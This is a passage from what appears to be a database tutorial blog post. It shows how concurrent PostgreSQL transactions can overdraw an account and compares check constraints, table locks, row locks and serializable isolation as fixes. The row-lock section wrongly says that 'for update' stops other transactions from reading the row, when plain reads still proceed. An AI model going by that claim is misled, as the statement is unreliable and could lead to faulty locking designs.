  # corresponding positive amount from B to A.
  if amount &lt; 0:
    moveMoney(to, from, -1*amount)
    return

  # Start a transaction so that all of our queries/updates succeed or fail as a
  # unit.
  txn = db.begin()

  # Make sure the $from account has a balance of at least $amount.
  currBalance = txn.query('select balance from accounts where name = $from')
  if currBalance &lt; amount:
    txn.rollback()
    throw exception

  # Move the money as before.
  txn.execute('update accounts set balance = balance - $amount where name = $from')
  txn.execute('update accounts set balance = balance + $amount where name = $to')

  # Commit the transaction.
  txn.commit()
</code></pre><p>But there’s a problem with this! Using a transaction only ensures that all of
the writes succeed or fail together, it does <em>not</em> provide any guarantees that
all of the statements in the transaction execute “at the same time” (i.e. the
transactions are not <em>serializable</em>).</p>
<h2 id="preventing-concurrency-bugs">Preventing concurrency bugs</h2>
<p>Let’s simulate two different actors calling <code>moveMoney('A', 'B', 10)</code>
concurrently, again with <code>A</code> having an initial balance of $10 and <code>B</code> having $0:</p>
<table>
<thead>
<tr>
<th>Actor 1</th>
<th>Actor 2</th>
</tr>
</thead>
<tbody>
<tr>
<td><code>begin</code></td>
<td></td>
</tr>
<tr>
<td><code>select balance from accounts where name = 'A'</code></td>
<td></td>
</tr>
<tr>
<td></td>
<td><code>begin</code></td>
</tr>
<tr>
<td></td>
<td><code>select balance from accounts where name = 'A'</code></td>
</tr>
<tr>
<td><code>update accounts set balance = balance - 10 where name = 'A'</code></td>
<td></td>
</tr>
<tr>
<td><code>update accounts set balance = balance + 10 where name = 'B'</code></td>
<td></td>
</tr>
<tr>
<td><code>commit</code></td>
<td></td>
</tr>
<tr>
<td></td>
<td><code>update accounts set balance = balance - 10 where name = 'A'</code></td>
</tr>
<tr>
<td></td>
<td><code>update accounts set balance = balance + 10 where name = 'B'</code></td>
</tr>
<tr>
<td></td>
<td><code>commit</code></td>
</tr>
</tbody>
</table>
<p>Now, if we check the account balances, we can see a problem:</p>
<pre><code>postgres=# select * from accounts ;
 name | balance
------+---------
 A    |     -10
 B    |      20
</code></pre><p>Both actors read the initial balance as $10, and therefore allowed the
operations to proceed. The transaction is ensuring that $10 is deducted from <code>A</code>
<em>if and only if</em> $10 is deposited into <code>B</code>, but two transactions can still be
reading and making decisions based on the same data concurrently.</p>
<p>(PostgreSQL by default does <em>not</em> allow two transactions to <em>write</em> the same
data concurrently; after Actor 1 updates <code>A</code>’s balance, Actor 2 isn’t able to
update <code>A</code>’s balance until after the first transaction is committed or rolled
back.)</p>
<h2 id="check-constraints"><code>check</code> constraints</h2>
<p>There are a few ways we can fix this. One way would be to add a check
constraint:</p>
<div><pre><code data-lang="sql"><span>alter</span><span> </span><span>table</span><span> </span><span>accounts</span><span> </span><span>add</span><span> </span><span>constraint</span><span> </span><span>nonnegative_balance</span><span> </span><span>check</span><span> </span><span>(</span><span>balance</span><span> </span><span>&gt;=</span><span> </span><span>0</span><span>);</span><span>
</span></code></pre></div><p>With this constraint, Actor 2’s <code>update</code> will fail because the constraint would
be violated. In fact, we would no longer even need to check the previous balance
in our application code at all, because the database itself would ensure no
account’s balance ever goes below zero.</p>
<h2 id="table-locks">Table locks</h2>
<p>Another approach would be to use a lock. Before we start reading or writing data
from the <code>accounts</code> table, we can use a lock to ensure that our transaction has
exclusive access to that table until we roll back or commit:</p>
<div><pre><code data-lang="diff"> begin;
<span>+lock table accounts;
</span><span></span> select balance from accounts where name = 'A';
 update accounts set balance = balance - 10 where name = 'A';
 update accounts set balance = balance + 10 where name = 'B';
 commit;
</code></pre></div><p>The <code>lock table accounts</code> statement will not finish until no other transactions
have any locks on the <code>accounts</code> table, and will prevent all other transactions
from accessing the <code>accounts</code> table until our transaction is committed or rolled
back.</p>
<h2 id="row-locks">Row locks</h2>
<p>Locking the entire accounts table is an effective way to prevent overdrawing an
account, but it also needlessly slows down our banking program. If someone is
trying to move money from <code>A</code> to <code>B</code> while someone else is trying to move money
from <code>B</code> to <code>C</code>, the second person’s transaction won’t be able to start until
the first transaction completes, even though they’re touching different
accounts.</p>
<p>Luckily, rather than acquiring a lock on the entire table, we can just acquire a
lock on the row that we’re deducting money from. To do this, we can use <code>for update</code> at the end of our <code>select</code> statement:</p>
<div><pre><code data-lang="sql"><span>select</span><span> </span><span>balance</span><span> </span><span>from</span><span> </span><span>accounts</span><span> </span><span>where</span><span> </span><span>name</span><span> </span><span>=</span><span> </span><span>'A'</span><span> </span><span>for</span><span> </span><span>update</span><span>;</span><span>
</span></code></pre></div><p>Now, other transactions won’t be able to read this row until our transaction is
committed or rolled back (<code>for update</code> can only be used inside a transaction).</p>
<h2 id="transaction-isolation-levels">Transaction isolation levels</h2>
<p>One other way to ensure that we don’t overdraw an account is to change the
isolation level of the transaction:</p>
<div><pre><code data-lang="sql"><span>begin</span><span> </span><span>transaction</span><span> </span><span>isolation</span><span> </span><span>level</span><span> </span><span>serializable</span><span>;</span><span>
</span><span></span><span>select</span><span> </span><span>balance</span><span> </span><span>from</span><span> </span><span>accounts</span><span> </span><span>where</span><span> </span><span>name</span><span> </span><span>=</span><span> </span><span>'A'</span><span>;</span><span>
</span><span></span><span>update</span><span> </span><span>accounts</span><span> </span><span>set</span><span> </span><span>balance</span><span> </span><span>=</span><span> </span><span>balance</span><span> </span><span>-</span><span> </span><span>10</span><span> </span><span>where</span><span> </span><span>name</span><span> </span><span>=</span><span> </span><span>'A'</span><span>;</span><span>
</span><span></span><span>update</span><span> </span><span>accounts</span><span> </span><span>set</span><span> </span><span>balance</span><span> </span><span>=</span><span> </span><span>balance</span><span> </span><span>+</span><span> </span><span>10</span><span> </span><span>where</span><span> </span><span>name</span><span> </span><span>=</span><span> </span><span>'B'</span><span>;</span><span>
</span><span></span><span>commit</span><span>;</span><span>
</span></code></pre></div><p>The PostgreSQL manual has <a href="https://www.postgresql.org/docs/12/sql-set-transaction.html">a good description of <code>serializable</code></a>:</p>
<blockquote>
<p>If a pattern of reads and writes among concurrent serializable transactions
would create a situation which could not have occurred for any serial
(one-at-a-time) execution of those transactions, one of them will be rolled
back with a <code>serialization_failure</code> error.</p>
</blockquote>
<p>Where a row or table lock would prevent a second transaction from reading the
balance until the previous transaction committed, with <code>isolation level serializable</code> the second transaction would immediately fail with an error
message: “could not serialize access due to concurrent update.”</p>
<p>There’s a good explanation of the “serializable” consistency model—and how it
differs from other models—<a href="https://jepsen.io/consistency">on the Jepsen site</a>.</p>
